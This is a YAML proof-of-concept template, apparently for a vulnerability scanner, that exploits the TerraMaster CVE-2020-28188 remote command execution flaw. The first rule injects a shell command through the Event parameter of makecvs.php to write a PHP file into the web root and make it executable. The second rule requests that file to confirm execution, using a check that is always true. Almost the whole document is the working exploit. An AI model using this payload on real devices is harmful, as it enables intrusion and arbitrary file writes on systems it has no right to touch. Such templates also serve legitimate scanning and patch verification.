name: poc-yaml-terramaster-cve-2020-28188-rce
binding: 4b9ed498-8e2b-4353-8c61-60449282e257
manual: true
detail:
    author: 1au
    links:
        - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-1548
    vulnerability:
        id: CT-147577
        level: critical
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    r2: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>"%20>>%20/usr/www/{{r2}}.php%20&&%20chmod%20755%20/usr/www/{{r2}}.php||
            follow_redirects: false
        expression: response.body.bcontains(bytes("Service,DateTime")) && response.status == 200 && "text/csv" in response.headers
    r1:
        request:
            cache: true
            method: GET
            path: /{{r2}}.php
            follow_redirects: false
        expression: response.status == 200 && md5(r2).contains(md5(r2))
expression: r0() && r1()
